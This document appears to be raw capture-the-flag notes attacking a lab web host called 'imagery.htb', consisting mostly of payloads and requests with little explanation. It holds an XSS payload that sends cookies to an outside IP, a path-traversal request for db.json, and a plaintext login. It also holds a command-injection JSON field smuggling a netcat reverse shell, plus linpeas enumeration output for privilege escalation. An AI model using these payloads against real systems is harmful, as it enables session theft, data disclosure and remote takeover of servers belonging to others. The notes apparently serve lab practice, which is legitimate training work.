
IP: 10.129.203.166   
My: 10.10.16.41

```html
<img src=xyc onerror="document.location='http://10.10.16.18:4444/'+document.cookie">
```

```http
GET /admin/get_system_log?log_identifier=../db.json HTTP/1.1
Host: 10.10.11.88:8000
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.88:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNkKcA.y_ayZBpbUdiX3LQpJlHPIewLdCM
If-None-Match: "1759005760.518486-2520-2828407261"
Connection: keep-alive


```

`testuser@imagery.htb` : `iambatman`

```http
POST /apply_visual_transform HTTP/1.1
Host: 10.129.203.166:8000
Content-Length: 208
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://10.129.203.166:8000
Referer: http://10.129.203.166:8000/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aNkLUQ._tWnq8qqNyS1UfF4egX5EYY-AFo
Connection: keep-alive

{"imageId":"4be0106f-0082-4343-878c-ea6e5ea38217","transformType":"crop","params":{"x":"4","y":"4","width":";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.41 4444 >/tmp/fiei;","height":"4"}}

```


linpeas.sh
```sh
systemd+     679  0.0  0.3  22492 14144 ?        Ss   09:09   0:02 /usr/lib/systemd/systemd-resolved
  └─(Caps) 0x0000000000002000=cap_net_raw
root         768  0.2  0.0  85424  2700 ?        S<sl 09:09   0:24 /usr/sbin/auditd
_laurel      771  0.1  0.1  10408  6892 ?        S<   09:09   0:17  _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
  └─(Caps) 0x0000000000080004=cap_dac_read_search,cap_sys_ptrace
  root         931  0.0  0.3  54628 12148 ?        Ss   09:09   0:00 /usr/bin/VGAuthService
root         934  0.1  0.2 319024 11056 ?        Ssl  09:09   0:14 /usr/bin/vmtoolsd
root         936  0.0  0.0   4004  3092 ?        Ss   09:09   0:00 dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root        1409  0.0  0.0   6920  2884 ?        Ss   09:09   0:00 /usr/sbin/cron -f -P
root        1425  0.0  0.0   7140  2212 tty1     Ss+  09:09   0:00 /sbin/agetty -o -p -- u --noclear - linux
root        1646  0.0  0.2 315692  9340 ?        Ssl  09:10   0:00 /usr/libexec/upowerd


# crontab
/usr/bin/crontab
* * * * * python3 /home/web/web/bot/admin.py  

# Systemd Information 
flaskapp.service: Uses relative path 'app.py' (from ExecStart=/home/web/web/env/bin/python app.py)   

# PGP Keys and Related Files
Found: /home/web/.gnupg
total 16
drwx------ 2 web web 4096 Sep 28 11:59 .
drwxr-x--- 8 web web 4096 Sep 28 11:59 ..
-rw------- 1 web web   32 Sep 28 11:59 pubring.kbx
-rw------- 1 web web 1200 Sep 28 11:59 trustdb.gpg


Capabilities
/snap/snapd/24792/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
/snap/snapd/25202/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p

backup
drwxr-xr-x 2 root root 4096 Sep 22 18:56 /var/backup total 22516
-rw-rw-r-- 1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes


Custom processes
mkdir -p /home/web/.local/share/applications
/bin/bash /usr/bin/google-chrome --version
/usr/local/bin/chromedriver --port=44341
gpg-agent --homedir /home/web/.gnupg --use-standard-socket --daemon
```